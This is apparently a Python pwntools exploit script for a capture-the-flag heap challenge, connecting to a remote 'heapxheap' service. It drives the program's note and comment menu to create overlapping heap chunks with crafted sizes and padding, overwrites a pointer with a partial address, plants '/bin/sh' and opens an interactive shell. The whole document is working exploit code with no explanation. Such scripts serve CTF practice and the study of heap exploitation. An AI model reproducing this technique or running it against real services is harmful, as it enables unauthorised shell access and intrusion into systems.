#!/usr/bin/python

from pwn import *

def create_note(msg):
  s.sendline("1")
  s.recvuntil("NOTE : ")
  s.send(msg)
  s.recvuntil("MENU> ")

def del_note(idx):
  s.sendline("2")
  s.recvuntil("> ")
  s.sendline("%d"%idx)
  s.recvuntil("MENU> ")

def write_comment(idx,sz,comment):
  s.sendline("3")
  s.recvuntil("> ")
  s.sendline("%d"%idx)
  s.recvuntil("> ")
  s.sendline("%d"%sz)
  s.recvuntil("> ")
  s.send(comment)
  s.recvuntil("> ")

def del_comment(idx):
  s.sendline("4")
  s.recvuntil("> ")
  s.sendline("%d"%idx)
  s.recvuntil("> ")

def update_comment(idx,comment):
  s.sendline("5")
  s.recvuntil("> ")
  s.sendline("%d"%idx)
  s.recvuntil("> ")
  s.send(comment)
  s.recvuntil("> ")

def make_hash(idx):
  s.sendline("6")
  s.recvuntil("> ")
  s.sendline("%d"%idx)
  s.recvuntil("> ")

def show_data():
  s.sendline("7")
  return s.recvuntil("MENU> ")

def set_pass(pw):
  s.sendline("8")
  s.recvuntil(")\n")
  s.sendline(pw)
  s.recvuntil("> ")

if __name__ == "__main__":
  #s = process("./heap")
  s = remote("heapxheap.eatpwnnosleep.com", 20000)

  create_note("A"*100)
  create_note("B"*100)
  create_note("C"*100)
  create_note("D"*100)
  create_note("D"*100)

  write_comment(1, 0x38, "E"*0x30)
  write_comment(2, 0x100, "\x00"*16+"F"*0xe0+p64(0x100))
  write_comment(3, 0xf0, "G"*0xef)
  write_comment(4, 0x100, "H"*0xff)
  write_comment(5, 0x100, "H"*0xff)

  del_comment(1)
  del_comment(2)

  set_pass("ToE_heap\x00"+"H"*(0x38-9))
  #pause()
  #create_note("I"*100)
  write_comment(1,0x80,"I"*0x6e)
  write_comment(2,0x60,"J"*0x6e)

  del_comment(1)
  #del_comment(5)
  #pause()
  del_comment(3)
  create_note("/bin/sh\x00")
  update_comment(2,"\xd0\x0a\x40")
  s.sendline("6")
  s.sendline("6")
  s.interactive()
  
